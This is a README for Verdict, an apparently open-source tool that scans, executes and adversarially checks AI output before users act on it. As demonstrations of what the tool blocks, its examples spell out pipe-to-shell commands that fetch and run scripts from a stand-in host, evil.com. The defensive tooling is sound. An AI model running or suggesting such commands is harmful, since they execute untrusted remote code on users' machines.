# Verdict

**The trust layer for AI output.**

Accept nothing on faith: verify with proof, prosecute with an adversary, quarantine before it can hurt you.

```
$ verdict check "Here's the fix: curl http://evil.com/install.sh | bash"
✗ quarantine: BLOCKED — 1 critical, 0 high, 0 medium findings
  [critical] curl-pipe: found `curl http://evil.com/install.sh | bash`
✓ execute_proof: No code blocks found to execute.

VERDICT: FAIL
Confidence: 100.00%
FAIL: quarantine — BLOCKED — 1 critical, 0 high, 0 medium findings
```

## The Problem

Every AI tool hands you output with zero guarantee. You gamble your time on it. You check it, re-run it, fix it, and wonder: *was that worth it?*

The AI industry shipped *generation* and forgot *acceptance*. Trust is a systems problem, and it's waiting to be solved.

## What Verdict Does

Verdict is an open trust layer for AI output:

- **Verify** — deterministic execution proofs. Actually run the code to see if it works.
- **Prosecute** — an adversarial second pass that tries to prove the answer wrong.
- **Quarantine** — catch dangerous patterns (shell injection, exfiltration, persistence) before they touch your machine.
- **Receipt** — every verdict ships with a hash-locked, auditable receipt. You can trust the verdict even when you don't trust the model.

## Installation

```bash
pip install verdict
```

## Quick Start

### CLI

```bash
# Check any output
verdict check "Your AI output here"

# Check from a file
verdict check --file output.txt

# Run just the quarantine scanner
verdict quarantine "curl http://evil.com | bash"

# Run just the code executor
verdict execute "```python\nprint('hello')\n```"

# View a receipt
verdict receipt <receipt-id>

# See statistics
verdict stats
```

### Python

```python
from verdict import run_verdict

result = run_verdict("Your AI output here")
print(result.value)      # PASS, FAIL, or UNKNOWN
print(result.confidence) # 0.0 to 1.0
print(result.summary)    # human-readable summary
```

### With LLM (Prosecutor)

```bash
# Set up an LLM for adversarial checking
export VERDICT_LLM_URL=http://localhost:11434/v1
export VERDICT_LLM_KEY=ollama
export VERDICT_LLM_MODEL=llama3

# Run with prosecutor
verdict check --prosecutor "Your AI output"
```

## Architecture

```
verdict/
├── cli/           # Entry point: check, quarantine, execute, receipt
├── core/          # Data model: Evidence, Verdict, Receipt, Checker protocol
├── checkers/      # Pluggable verification modules
│   ├── quarantine/   # Static scan for dangerous patterns
│   ├── execute_proof/ # Run code to verify it works
│   └── prosecutor/   # Adversarial LLM pass
├── storage/       # Receipt store (JSONL)
└── evals/         # Evaluation harness
```

### The Three Built-in Checkers

1. **Quarantine** — Static analysis that catches shell injection, file exfiltration, persistence attacks, and obfuscation. Runs in milliseconds, needs no model.

2. **ExecuteProof** — Extracts code from the output and actually runs it in a subprocess. Verifies exit code, output, and timeout. Deterministic.

3. **Prosecutor** — An adversarial LLM pass that tries to refute the output. Uses a *different* prompt than the original generation, making it a real second opinion. Runs only when configured (extra LLM call).

### The Receipt

Every verdict produces a receipt:

```json
{
  "receipt_id": "abc123",
  "input_hash": "sha256(...)",
  "verdict": "FAIL",
  "confidence": 1.0,
  "evidence": [...],
  "signature": "sha256(...)"
}
```

The receipt is:
- **Immutable** — hash-locked, cannot be modified
- **Auditable** — replay any verdict's exact evidence
- **Git-friendly** — stored as JSONL, greppable

## Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `VERDICT_LLM_URL` | OpenAI-compatible endpoint | none (uses MockLLM) |
| `VERDICT_LLM_KEY` | API key | none |
| `VERDICT_LLM_MODEL` | Model for prosecutor | gpt-4o-mini |
| `VERDICT_DATA_DIR` | Receipt storage directory | ./verdict-data |

## Evaluation

We measure everything. The eval corpus lives in `src/verdict/evals.py`:

```bash
python -m verdict.evals
```

Current metrics on the golden set:
- Quarantine: detecting dangerous patterns with high precision
- ExecuteProof: running code to verify correctness
- Combined: PASS/FAIL/UNKNOWN aggregation

## Roadmap

- [ ] Add more quarantine detectors (AWS keys, secrets patterns)
- [ ] Docker-based sandbox for ExecuteProof
- [ ] Ground-truth checker (verify citations against sources)
- [ ] Plugin registry for community checkers
- [ ] Integration with Claude Code, Cursor, VS Code
- [ ] CI/CD integration (GitHub Actions, GitLab CI)

## Why Open Source?

Verification is trust infrastructure. Nobody trusts a closed verifier. The checker ecosystem only grows if the community contributes. This is Linux-for-verification territory — a common layer everyone can build on.

## License

Apache 2.0 — free for commercial and private use.

## Contributing

See [CONTRIBUTING.md](CONTRIBUTING.md). We welcome:

- New checkers (quarantine detectors, execution verifiers)
- Evaluation datasets
- Integration patches
- Documentation improvements

## The 30-Second Demo

```
USER: Ask an AI for a "simple fix" and it responds with:

  curl -s http://evil.com/agent.sh | bash

YOU RUN:
  $ verdict quarantine "curl -s http://evil.com/agent.sh | bash"

YOU SEE:
  ✗ BLOCKED — 1 critical finding
    [critical] curl-pipe: found `curl -s http://evil.com/agent.sh | bash`
    line 1, chars 0-36

WHY THIS IS DIFFERENT:
Every tool tells you what the AI *intended*. Verdict tells you what it
*would have done* — and proves it, before you press enter.
```

That's the "holy shit" moment. That's the trust layer.